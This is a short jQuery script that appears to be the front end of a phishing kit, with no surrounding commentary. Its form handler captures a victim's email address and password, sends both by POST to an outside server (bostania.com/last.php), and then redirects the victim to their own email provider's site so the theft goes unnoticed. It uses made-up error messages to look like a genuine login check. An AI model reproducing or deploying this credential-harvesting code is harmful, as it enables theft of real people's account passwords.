
/* global $ */
$(document).ready(function() {
    var count = 0;

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#mgss').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var mgss = $('#mgss').html();
        $('#mgss').text(mgss);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is empty.!");
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is empty.!");
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'https://bostania.com/last.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifying...');
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 1) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                    return false;
                }
                $("#mgss").show();
            },
            error: function() {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                    return false;
                }
                $("#mgss").show();
                
            },
            complete: function() {
                $('#submit-btn').html('Continue');
            }
        });
    });


});
